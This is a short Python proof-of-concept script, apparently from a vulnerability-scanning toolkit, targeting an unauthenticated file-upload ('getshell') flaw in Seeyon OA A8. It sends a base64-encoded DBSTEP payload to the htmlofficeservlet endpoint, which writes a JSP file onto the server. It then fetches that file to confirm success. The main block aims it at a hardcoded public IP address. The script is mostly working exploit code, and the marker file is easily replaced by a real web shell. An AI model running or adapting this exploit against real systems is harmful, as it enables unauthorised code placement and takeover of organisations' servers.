#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/6/27 16:32
# @Author  : Goop
# @Site    : 
# @File    : A8_getshell.py
# @Software: PyCharm

import time
import base64

import requests


def poc(url, **kwargs):
    if kwargs.get('ip'):
        url = 'http://' + kwargs.get('ip') + ':' + kwargs.get('port')
    else:
        url = url

    ua = {
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}
    pk2="""REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkZEFsUWJZREdOSGxaY2ZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JW91dC5wcmludGxuKCJDaGVja192dWxuX3NoZWxsIik7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJT42ZTRmMDQ1ZDRiODUwNmJmNDkyYWRhN2UzMzkwZDdjZQ=="""
    try:
        req = requests.post(url + '/seeyon/htmlofficeservlet', headers=ua, data=base64.b64decode(pk2))
        time.sleep(1.5)
        req2 = requests.get(url + '/seeyon/seeyouvuln.jsp', allow_redirects=False)
        if "Check_vuln_shell" in req2.text:
            res = "发现目标存在 致远 OA A8 无需认证 Getshell 漏洞, check url: %s" % url + '/seeyon/seeyouvuln.jsp'
            return res
    except:
        pass
    # if "Miko" in req2.text:
    #     result = "发现目标存在 致远 OA A8 无需认证 Getshell 漏洞, check url: %s" % url
    #     return result


if __name__ == "__main__":
    a = poc("http://41.72.124.98:9000")
    print(a)
